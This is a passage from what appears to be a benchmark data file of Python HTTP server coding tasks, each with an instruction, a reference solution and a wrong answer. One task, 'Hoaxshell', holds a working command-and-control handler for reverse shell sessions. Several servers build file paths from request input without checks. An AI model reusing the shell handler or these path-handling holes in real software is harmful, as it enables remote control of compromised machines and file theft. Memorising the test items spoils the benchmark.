    "Canonical_solution": "import os\nimport sys\nimport json\nimport string\nimport random\nimport base64\nimport requests\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HTTPPostHandler:\n    def __init__(self, output_dir='', port=80):\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n\n    class Handler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_POST(self):\n            self._set_headers()\n            self.data_string = self.rfile.read(int(self.headers['Content-Length']))\n            self.send_response(200)\n            self.end_headers()\n\n            json_data = json.loads(self.data_string)\n            b64_data = json_data.get('data')\n            filetype = json_data.get('type')\n            owner = json_data.get('owner')\n            module = json_data.get('module')\n            session = json_data.get('session')\n            filename = json_data.get('filename')\n\n            data = base64.b64decode(b64_data)\n            if session.startswith('_b64'):\n                session = base64.b64decode(session[6:]).decode('ascii')\n\n            if not filetype.startswith('.'):\n                filetype = '.' + filetype\n\n            if not filename:\n                filename = str().join([random.choice(string.ascii_lowercase + string.digits) for _ in range(3)]) + filetype\n\n            output_path = os.path.join(self.OUTPUT_DIR, owner, 'files', filename)\n\n            requests.post(\"http://0.0.0.0/api/file/add\", {\"filename\": filename, \"owner\": owner, \"module\": module, \"session\": session})\n\n            with open(output_path, 'wb') as fp:\n                fp.write(data)\n\n    def run(self):\n        httpd = HTTPServer(('0.0.0.0', self.port), self.Handler)\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport json\nimport base64\nimport os\nimport requests\n\nclass HTTPPostHandler:\n    OUTPUT_DIR = ''\n    port = 80\n\n    def __init__(self, output_dir: str = '', port: int = 80) -> None:\n        self.OUTPUT_DIR = output_dir\n        self.port = port\n        os.makedirs(self.OUTPUT_DIR, exist_ok=True)\n        self.server_address = ('', self.port)\n        self.httpd = socketserver.TCPServer(self.server_address, self.Handler)\n        self.httpd.output_dir = self.OUTPUT_DIR\n\n    def run(self) -> None:\n        print(f\"Starting HTTP server on port {self.port}\")\n        self.httpd.serve_forever()\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        def _set_headers(self) -> None:\n            self.send_response(200)\n            self.send_header('Content-type', 'application/json')\n            self.end_headers()\n\n        def do_POST(self) -> None:\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            try:\n                data = json.loads(post_data.decode('utf-8'))\n            except json.JSONDecodeError:\n                self.send_error(400, \"Invalid JSON\")\n                return\n\n            files = data.get('files', [])\n            for file in files:\n                if 'data' not in file or 'filename' not in file:\n                    self.send_error(400, \"Missing required fields in file data\")\n                    return\n                base64_data = file['data']\n                filename = file['filename']\n\n                try:\n                    decoded_data = base64.b64decode(base64_data)\n                except Exception as e:\n                    self.send_error(500, f\"Base64 decoding error: {str(e)}\")\n                    return\n\n                file_path = os.path.join(self.server.output_dir, filename)\n                with open(file_path, 'wb') as f:\n                    f.write(decoded_data)\n\n                try:\n                    response = requests.post(\n                        'https://api.example.com/register',\n                        json={'filename': filename, 'metadata': file.get('metadata', {})}\n                    )\n                    response.raise_for_status()\n                except requests.RequestException as e:\n                    self.send_error(500, f\"API registration failed: {str(e)}\")\n                    return\n\n            self._set_headers()\n            self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server using the http.server module, capable of handling GET requests with customizable response status codes and running in a separate thread.\n\nClass Description: The HttpServer class provides a lightweight HTTP server implementation that can be started and stopped programmatically. It handles GET requests, supports custom response status codes via URL paths, and runs in a daemon thread for non-blocking operation.\n\nAttributes:\n\nDEFAULT_RESPONSE: bytes - Default response body sent for successful requests (default: b\"Hello!\")\nserver: HTTPServer - Instance of the HTTP server\nserver_thread: Thread - Thread running the server's serve_forever loop\n\nMethods:\n\n__init__: () -> None - Initializes the HttpServer instance with server and server_thread set to None\ncreate_server: () -> HTTPServer - Creates and returns an HTTPServer instance bound to localhost on an available port\nrun_server: () -> Tuple[Thread, HTTPServer] - Starts the server in a daemon thread and returns both the thread and server objects\nstart: () -> None - Convenience method to start the server (calls run_server and stores the results)\nshutdown: () -> None - Stops the server and joins the server thread if they exist\n\nNested Class: Handler(BaseHTTPRequestHandler) - Custom request handler for processing HTTP requests\n\nHandler Attributes:\nprotocol_version: str - HTTP protocol version (default: \"HTTP/1.1\")\ntimeout: int - Connection timeout in seconds (default: 3)\nSTATUS_RE: Pattern - Regular expression for matching status code paths\n\nHandler Methods:\ndo_GET: () -> None - Handles GET requests, supports /status/{code} paths to return specific status codes",
    "Canonical_solution": "import re\nfrom http import HTTPStatus\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom threading import Thread\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n\n    class Handler(BaseHTTPRequestHandler):\n        protocol_version = \"HTTP/1.1\"\n        timeout = 3\n\n        STATUS_RE = re.compile(r\"/status/(\\d+)\")\n\n        def do_GET(self):\n            status_match = self.STATUS_RE.fullmatch(self.path)\n            status = 200\n            if status_match:\n                status = int(status_match.group(1))\n            if status == 200:\n                body = HttpServer.DEFAULT_RESPONSE\n                self.send_response(HTTPStatus.OK)\n                self.send_header(\"Content-Length\", str(len(body)))\n                self.end_headers()\n                self.wfile.write(body)\n            else:\n                self.send_error(status)\n\n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n\n    def create_server(self):\n        server_address = (\"127.0.0.1\", 0)\n        return HTTPServer(server_address, self.Handler)\n\n    def run_server(self):\n        self.server = self.create_server()\n        self.server_thread = Thread(\n            target=self.server.serve_forever, daemon=True, name=\"Test server worker\"\n        )\n        self.server_thread.start()\n        return self.server_thread, self.server\n\n    def start(self):\n        self.server_thread, self.server = self.run_server()\n\n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n        if self.server_thread:\n            self.server_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport threading\nimport re\n\nclass HttpServer:\n    DEFAULT_RESPONSE = b\"Hello!\"\n    server = None\n    server_thread = None\n\n    class Handler(http.server.BaseHTTPRequestHandler):\n        protocol_version = \"HTTP/1.1\"\n        timeout = 3\n        STATUS_RE = re.compile(r'/status/(\\d+)')\n\n        def do_GET(self):\n            match = self.STATUS_RE.match(self.path)\n            if match:\n                code = int(match.group(1))\n                self.send_response(code)\n                self.end_headers()\n                if code == 200:\n                    self.wfile.write(HttpServer.DEFAULT_RESPONSE)\n            else:\n                self.send_response(200)\n                self.end_headers()\n                self.wfile.write(HttpServer.DEFAULT_RESPONSE)\n\n    def __init__(self):\n        self.server = None\n        self.server_thread = None\n\n    def create_server(self):\n        return http.server.HTTPServer((\"\", 8000), self.Handler)\n\n    def run_server(self):\n        server = self.create_server()\n        server_thread = threading.Thread(target=server.serve_forever, daemon=True)\n        server_thread.start()\n        return server_thread, server\n\n    def start(self):\n        self.server_thread, self.server = self.run_server()\n\n    def shutdown(self):\n        if self.server:\n            self.server.shutdown()\n            self.server_thread.join()"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server to serve static files (CSS, JavaScript, and images) with proper content types and error handling.\n\nClass Description: PVEDiscordDarkServer is a class that creates an HTTP server to serve static web resources including CSS files, JavaScript files, and various image formats (PNG, JPG, JPEG, SVG). It handles different file types with appropriate content headers and provides error responses for missing files or unsupported requests.\n\nAttributes:\nPORT: int - The port number on which the HTTP server will run\nDIR_SASS: str - The directory path containing CSS files\nDIR_IMAGES: str - The directory path containing image files\nDIR_JS: str - The directory path containing JavaScript files\n\nMethods:\n__init__(port=3000) -> None - Initializes the server with the specified port (default: 3000) and sets up directory paths for static files\nrun() -> None - Starts the HTTP server and begins serving requests indefinitely until interrupted\nRequestHandler: class - Inner class that handles HTTP requests (inherits from BaseHTTPRequestHandler)\n    __init__(*args, **kwargs) -> None - Initializes the request handler with directory paths\n    log_message(format, *args) -> None - Overrides default logging to suppress log messages\n    _set_headers(status, type) -> None - Helper method to set HTTP response headers\n    do_GET() -> None - Handles GET requests, serves appropriate files with correct content types, or returns error responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.path.dirname(__file__), \"sass\")\n        self.DIR_IMAGES = os.path.join(os.path.dirname(__file__), \"images\")\n        self.DIR_JS = os.path.join(os.path.dirname(__file__), \"js\")\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header(\"Content-type\", type)\n            self.end_headers()\n\n        def do_GET(self):\n            status = 200\n            type = \"application/json\"\n            data = None\n\n            file = self.path.rpartition(\"/\")[2]\n            ext = file.rpartition(\".\")[2]\n\n            if ext == \"css\":\n                data = open(os.path.join(self.DIR_SASS, \"PVEDiscordDark.css\"), \"rb\").read()\n                type = \"text/css\"\n            elif ext == \"js\":\n                data = open(os.path.join(self.DIR_JS, \"PVEDiscordDark.js\"), \"rb\").read()\n                type = \"application/javascript\"\n            elif ext in (\"png\", \"jpg\", \"jpeg\"):\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/{ext}\"\n                except FileNotFoundError:\n                    status = 404\n            elif ext == \"svg\":\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/svg+xml\"\n                except FileNotFoundError:\n                    status = 404\n            else:\n                status = 400\n            self._set_headers(status, type)\n            if status == 200:\n                self.wfile.write(data)\n            else:\n                self.wfile.write(json.dumps({\"error\": status}).encode())\n\n    def run(self):\n        print(f\"Serving on localhost:{self.PORT}\")\n        server = HTTPServer(\n            server_address=(\"\", self.PORT),\n            RequestHandlerClass=lambda *args, **kwargs: self.RequestHandler(\n                *args,\n                DIR_SASS=self.DIR_SASS,\n                DIR_IMAGES=self.DIR_IMAGES,\n                DIR_JS=self.DIR_JS,\n                **kwargs\n            )\n        )\n        try:\n            server.serve_forever()\n        except KeyboardInterrupt:\n            quit()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = 'css'\n        self.DIR_IMAGES = 'images'\n        self.DIR_JS = 'js'\n\n    def run(self):\n        with http.server.HTTPServer((\"\", self.PORT), self.RequestHandler) as httpd:\n            print(f\"Serving on port {self.PORT}\")\n            httpd.serve_forever()\n\n    class RequestHandler(http.server.BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            super().__init__(*args, **kwargs)\n            self.dir_sass = self.server.DIR_SASS\n            self.dir_js = self.server.DIR_JS\n            self.dir_images = self.server.DIR_IMAGES\n\n        def log_message(self, format, *args):\n            pass\n\n        def _set_headers(self, status, content_type):\n            self.send_response(status)\n            self.send_header('Content-type', content_type)\n            self.end_headers()\n\n        def do_GET(self):\n            path = self.path\n            if path == '/':\n                path = '/index.html'\n            ext = os.path.splitext(path)[1]\n            dir_map = {\n                '.css': self.dir_sass,\n                '.js': self.dir_js,\n                '.png': self.dir_images,\n                '.jpg': self.dir_images,\n                '.jpeg': self.dir_images,\n                '.svg': self.dir_images\n            }\n            if ext in dir_map:\n                dir_path = dir_map[ext]\n                file_path = os.path.join(dir_path, path.lstrip('/'))\n                if os.path.exists(file_path):\n                    with open(file_path, 'rb') as f:\n                        content = f.read()\n                    if ext == '.css':\n                        content_type = 'text/css'\n                    elif ext == '.js':\n                        content_type = 'application/javascript'\n                    else:\n                        if ext == '.png':\n                            content_type = 'image/png'\n                        elif ext == '.jpg' or ext == '.jpeg':\n                            content_type = 'image/jpeg'\n                        elif ext == '.svg':\n                            content_type = 'image/svg+xml'\n                        else:\n                            content_type = 'text/plain'\n                    self._set_headers(200, content_type)\n                    self.wfile.write(content)\n                else:\n                    self._set_headers(404, 'text/plain')\n                    self.wfile.write(b'File not found')\n            else:\n                self._set_headers(404, 'text/plain')\n                self.wfile.write(b'Unsupported request')"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for sharing and viewing log files from a specified directory. The server should handle GET requests to display available log files and serve their contents.\n\nClass Description: The LogServer class creates an HTTP server that serves log files from a specified directory. It uses a custom request handler (LogSharedHandler) to process HTTP requests and serve either a directory listing or file contents.\n\nAttributes:\n- log_path: str - The directory path where log files are stored\n- port: int - The port number on which the HTTP server will listen\n- httpd: Optional[HTTPServer] - The HTTP server instance (None until started)\n\nMethods:\n- __init__(log_path: str, port: int) -> None - Initializes the LogServer with the specified log directory path and port number\n- start() -> None - Starts the HTTP server on 0.0.0.0 (all interfaces) using the specified port and serves requests indefinitely\n\nThe LogSharedHandler (inner class) handles HTTP requests with these methods:\n- do_GET() -> None - Processes GET requests:\n  - For root path (\"/\"), returns an HTML page listing all available log files as clickable links\n  - For specific file paths, returns the content of the requested log file\n  - Returns 404 if requested file doesn't exist",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport os\nfrom typing import Optional\n\nclass LogSharedHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        log_path = os.getenv('LOG_PATH')\n        if self.path == \"/\":\n            html = \"<html><body>\"\n            for f in os.listdir(log_path):\n                html += f\"<p><a href=\\\"{f}\\\">{f}</a></p>\"\n            html += \"</body></html>\"\n\n            self.send_response(200)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(html.encode())\n        else:\n            p = log_path + self.path\n            try:\n                with open(p, \"rb\") as file:\n                    self.send_response(200)\n                    self.send_header(\"Content-type\", \"text/plain\")\n                    self.end_headers()\n                    self.wfile.write(file.read())\n            except FileNotFoundError:\n                self.send_error(404, \"File not found\")\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int):\n        self.log_path = log_path\n        self.port = port\n        self.httpd: Optional[HTTPServer] = None\n\n    def start(self):\n        self.httpd = HTTPServer(('0.0.0.0', self.port), LogSharedHandler)\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport os\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int):\n        self.log_path = log_path\n        self.port = port\n        self.httpd = None\n\n    def start(self):\n        self.httpd = socketserver.TCPServer((\"\", self.port), LogSharedHandler)\n        self.httpd.serve_forever()\n\nclass LogSharedHandler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        path = self.path\n        if path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            files = os.listdir(self.server.log_path)\n            html = \"<html><body><h1>Log Files</h1><ul>\"\n            for file in files:\n                html += f\"<li><a href='{file}'>{file}</a></li>\"\n            html += \"</ul></body></html>\"\n            self.wfile.write(html.encode())\n        else:\n            requested_file = os.path.join(self.server.log_path, path)\n            if os.path.isfile(requested_file):\n                with open(requested_file, 'r') as f:\n                    content = f.read()\n                self.send_response(200)\n                self.send_header('Content-type', 'text/plain')\n                self.end_headers()\n                self.wfile.write(content.encode())\n            else:\n                self.send_error(404, \"File not found\")"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Create a custom HTTP server class that handles GET, POST, and OPTIONS requests for managing shell sessions, including session verification, command execution, and response handling.\n\nClass Description: Hoaxshell is a custom HTTP request handler that extends BaseHTTPRequestHandler to manage reverse shell sessions. It handles session establishment, command execution, and response collection while maintaining session state.\n\nAttributes:\n- server_name: [str] - Name identifier for the server\n- header_id: [str] - Custom header identifier for session tracking\n- server_unique_id: [str] - Unique identifier for the server instance\n- command_pool: [dict] - Pool of commands to be executed per session\n\nMethods:\n- do_GET([self]) -> None - Handles GET requests for session verification and command retrieval\n- do_POST([self]) -> None - Handles POST requests for command output submission\n- do_OPTIONS([self]) -> None - Handles OPTIONS requests for CORS preflight\n- log_message([self, format, *args]) -> None - Overrides default logging to suppress messages\n- initiate_hoax_server() -> None - Static method to start the HTTP server with optional SSL support\n\nThe class interacts with session management components and implements custom request handling for shell session management, including session verification, command distribution, and response collection. It supports both HTTP and HTTPS modes with configurable ports and SSL certificates.",
    "Canonical_solution": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport ssl\n\nclass Hoaxshell(BaseHTTPRequestHandler):\n    server_name = 'Hoaxshell Multi-Handler'\n    header_id = None\n    server_unique_id = None\n    command_pool = {}\n\n    def do_GET(self):\n        timestamp = int(datetime.now().timestamp())\n        \n        if not self.header_id:\n            header_id_extract = [header.replace(\"X-\", \"\") for header in self.headers.keys() if re.match(\"X-[a-z0-9]{4}-[a-z0-9]{4}\", header)]\n            self.header_id = f'X-{header_id_extract[0]}'\n\n        try:\n            session_id = self.headers.get(self.header_id)\n        except:\n            session_id = None\n\n        if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):\n            if session_id in Sessions_Manager.legit_session_ids.keys():\n                h = session_id.split('-')\n                Sessions_Manager.verify.append(h[0])\n                Sessions_Manager.get_cmd.append(h[1])\n                Sessions_Manager.post_res.append(h[2])\n\n                Sessions_Manager.active_sessions[session_id] = {\n                    'IP Address': self.client_address[0],\n                    'Port': self.client_address[1],\n                    'execution_verified': False,\n                    'Status': 'Active',\n                    'last_received': timestamp,\n                    'OS Type': Sessions_Manager.legit_session_ids[session_id]['OS Type'],\n                    'frequency': Sessions_Manager.legit_session_ids[session_id]['frequency'],\n                    'Owner': self.server_unique_id,\n                    'self_owned': True,\n                    'aliased': False,\n                    'alias': None,\n                    'Listener': 'hoaxshell',\n                    'Shell': Sessions_Manager.legit_session_ids[session_id]['Shell'],\n                    'iface': Sessions_Manager.legit_session_ids[session_id]['iface'],\n                    'prompt': None,\n                    'Stability': 'Unstable'\n                }\n                self.command_pool[session_id] = []\n\n        elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        session_id = self.headers.get(self.header_id)\n        legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False\n\n        url_split = self.path.strip(\"/\").split(\"/\")\n\n        if (url_split[0] in Sessions_Manager.verify and legit) or \\\n           (legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):\n            \n            if Sessions_Manager.active_sessions[session_id]['execution_verified']:\n                print_to_prompt(f'\\r[{INFO}] Received \"Verify execution\" request from an already established session (ignored).')\n                return\n\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n            self.wfile.write(bytes('OK', \"utf-8\"))\n            Sessions_Manager.active_sessions[session_id]['execution_verified'] = True\n\n            try:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]\n                Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')\n\n            except IndexError:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'\n                Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')\n\n            try:\n                Thread(target=self.monitor_shell_state, args=(session_id,), name=f'session_state_monitor_{self.client_address[0]}', daemon=True).start()\n            except:\n                pass\n\n            new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])\n            new_session_data['session_id'] = session_id\n            new_session_data['alias'] = None\n            new_session_data['aliased'] = False\n            new_session_data['self_owned'] = False\n            Core_Server.announce_new_session(new_session_data)\n            del new_session_data\n\n        elif self.path.strip(\"/\") in Sessions_Manager.get_cmd and legit:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n\n            if len(self.command_pool[session_id]):\n                cmd = self.command_pool[session_id].pop(0)\n                if isinstance(cmd, dict):\n                    cmd = cmd['data']\n                self.wfile.write(bytes(cmd, 'utf-8'))\n            else:\n                self.wfile.write(bytes('None', 'utf-8'))\n\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n            return\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'')\n\n    def do_POST(self):\n        timestamp = int(datetime.now().timestamp())\n        session_id = self.headers.get(self.header_id)\n        legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False\n\n        if legit:\n            try:\n                Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n                self.server_version = Hoaxshell_Settings.server_version\n                self.sys_version = \"\"\n\n                if self.path.strip(\"/\") in Sessions_Manager.post_res and legit and \\\n                   session_id in Sessions_Manager.active_sessions.keys():\n                    \n                    try:\n                        self.send_response(200)\n                        self.send_header('Content-Type', 'text/plain')\n                        self.end_headers()\n                        self.wfile.write(b'OK')\n                        content_len = int(self.headers.get('Content-Length'))\n                        output = None\n                        output = self.rfile.read(content_len)\n                        output = self.cmd_output_interpreter(session_id, output, constraint_mode=Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])\n                        \n                        if not isinstance(output, int):\n                            if isinstance(output, str):\n                                if re.search(\"The term 'OK' is not recognized as the name of a cmdlet, function, script file\", output) or re.search('bash: line 1: OK: command not found', output):\n                                    return\n                                print(f'\\r{GREEN}{output}{END}') if output else do_nothing()\n                                print()\n                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                            elif isinstance(output, list):\n                                if not isinstance(output[1], int):\n                                    try:\n                                        Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)\n                                    except:\n                                        pass\n\n                    except ConnectionResetError:\n                        error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get(\"Content-Length\")}). Try limiting the command\\'s output.'\n                        if isinstance(output, str):\n                            print(error_msg)\n                            Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                        elif isinstance(output, list):\n                            try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)\n                            except: pass\n                        del error_msg\n\n                    finally:\n                        del output\n\n            except KeyError:\n                pass\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Move on mate.')\n\n    def do_OPTIONS(self):\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', self.headers[\"Origin\"])\n        self.send_header('Vary', \"Origin\")\n        self.send_header('Access-Control-Allow-Credentials', 'true')\n        self.send_header('Access-Control-Allow-Headers', Hoaxshell_Settings.header_id)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\n    def log_message(self, format, *args):\n        return\n\ndef initiate_hoax_server():\n    try:\n        if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \\\n           (Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):\n            exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')\n\n        port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl\n\n        try:\n            httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)\n        except OSError:\n            exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\\n')\n        except:\n            exit(f'\\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\\n')\n\n        if Hoaxshell_Settings.ssl_support:\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n            context.load_cert_chain(certfile=Hoaxshell_Settings.certfile, keyfile=Hoaxshell_Settings.keyfile)\n            httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)\n\n        Hoaxshell_server = Thread(target=httpd.serve_forever, args=(), name='hoaxshell_server')\n        Hoaxshell_server.daemon = True\n        Hoaxshell_server.start()\n        registered_services.append({\n            'service': Hoaxshell.server_name,\n            'socket': f'{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}'\n        })\n        print(f'[{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Hoaxshell.server_name}')\n\n    except KeyboardInterrupt:\n        Hoaxshell.terminate()\n```",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\nimport subprocess\nimport uuid\n\nclass Hoaxshell(http.server.BaseHTTPRequestHandler):\n    def __init__(self, *args, **kwargs):\n        self.server_name = \"HoaxShell\"\n        self.header_id = \"X-Session-ID\"\n        self.server_unique_id = str(uuid.uuid4())\n        self.command_pool = {}\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        session_id = self.headers.get(self.header_id)\n        if not session_id or session_id not in self.command_pool:\n            self.send_error(401, \"Invalid session\")\n            return\n        command = self.command_pool[session_id]\n        try:\n            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode()\n        except Exception as e:\n            output = f\"Error: {str(e)}\"\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/plain\")\n        self.end_headers()\n        self.wfile.write(output.encode())\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        command = post_data.decode('utf-8')\n        session_id = self.headers.get(self.header_id)\n        if not session_id or session_id not in self.command_pool:\n            self.send_error(401, \"Invalid session\")\n            return\n        self.command_pool[session_id] = command\n        self.send_response(200)\n        self.end_headers()\n\n    def do_OPTIONS(self):\n        self.send_response(200)\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.send_header(\"Access-Control-Allow-Methods\", \"GET, POST, OPTIONS\")\n        self.send_header(\"Access-Control-Allow-Headers\", self.header_id)\n        self.end_headers()\n\n    def log_message(self, *args):\n        pass\n\n    @staticmethod\n    def initiate_hoax_server(port=80, ssl_context=None):\n        server_address = ('', port)\n        httpd = socketserver.TCPServer(server_address, Hoaxshell)\n        if ssl_context:\n            httpd.socket = ssl_context.wrap_socket(httpd.socket, server_side=True)\n        print(f\"Starting HoaxShell server on port {port}\")\n        httpd.serve_forever()"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for resolving secret hashes to their corresponding secrets, specifically designed for XUD (Cross-chain Unidirectional Payment Channel) resolution.\n\nClass Description: The XUDResolver class is an HTTP server that handles POST requests containing secret hashes and responds with the corresponding secret if the hash matches a predefined secret. It uses Python's http.server module to create a simple HTTP server.\n\nAttributes:\n- host: str - The host address where the server will run (default: \"localhost\")\n- port: int - The port number for the server (default: 8000)\n- x_secret: str - A predefined secret in hexadecimal format\n- x_secret_hash: str - The SHA-256 hash of the predefined secret\n\nMethods:\n- __init__(host: str = \"localhost\", port: int = 8000) -> None - Initializes the XUDResolver with optional host and port parameters\n- resolve(request: dict) -> dict or None - Takes a request dictionary containing a \"secrethash\" and returns the corresponding secret if the hash matches, otherwise returns None\n- serve() -> None - Starts the HTTP server with a custom request handler that processes POST requests for secret resolution",
    "Canonical_solution": "import json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom hashlib import sha256\nfrom eth_utils import to_bytes, to_hex\n\nclass XUDResolver:\n    def __init__(self, host=\"localhost\", port=8000):\n        self.host = host\n        self.port = port\n        self.x_secret = \"0x2ff886d47b156de00d4cad5d8c332706692b5b572adfe35e6d2f65e92906806e\"\n        self.x_secret_hash = to_hex(sha256(to_bytes(hexstr=self.x_secret)).digest())\n\n    def resolve(self, request):\n        if \"secrethash\" not in request:\n            return None\n\n        if request[\"secrethash\"] == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self):\n        class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n            def __init__(self, *args, **kwargs):\n                self.resolver = kwargs.pop('resolver')\n                super().__init__(*args, **kwargs)\n\n            def do_POST(self):\n                try:\n                    content_len = int(self.headers.get(\"Content-Length\"))\n                    body = self.rfile.read(content_len)\n\n                    preimage = self.resolver.resolve(json.loads(body.decode(\"utf8\")))\n                    if preimage is None:\n                        self.send_response(404)\n                        self.end_headers()\n                    else:\n                        response = to_bytes(text=json.dumps(preimage))\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(response)\n                except BaseException:\n                    self.send_response(400)\n                    self.end_headers()\n\n        httpd = HTTPServer((self.host, self.port), lambda *args, **kwargs: SimpleHTTPRequestHandler(*args, resolver=self, **kwargs))\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
